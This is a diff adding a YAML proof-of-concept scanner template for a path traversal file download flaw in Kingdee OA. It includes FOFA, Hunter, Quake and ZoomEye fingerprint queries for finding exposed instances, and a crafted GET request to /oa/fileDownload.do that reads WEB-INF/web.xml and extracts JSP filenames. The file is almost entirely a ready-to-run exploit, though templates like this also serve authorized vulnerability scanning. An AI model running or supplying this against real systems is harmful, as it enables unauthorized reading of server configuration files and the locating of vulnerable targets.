@@ -1,0 +1,45 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: body="document.form_static.j_password.value"
+    hunter-query: web.body="/oa/scripts/cookie.js" | fofa 那个指纹 hunter涉黑 没数据
+    quake-query: body:"document.form_static.j_password.value"
+    zoomeye-query: app:"金蝶 OA"  | 涉黑 被保护
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips:
+    
+name: poc-yaml-Kingdee-OA-fileDownload.do-file-down
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml
+      follow_redirects: false      
+      headers:
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("xml version")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+expression: r0()
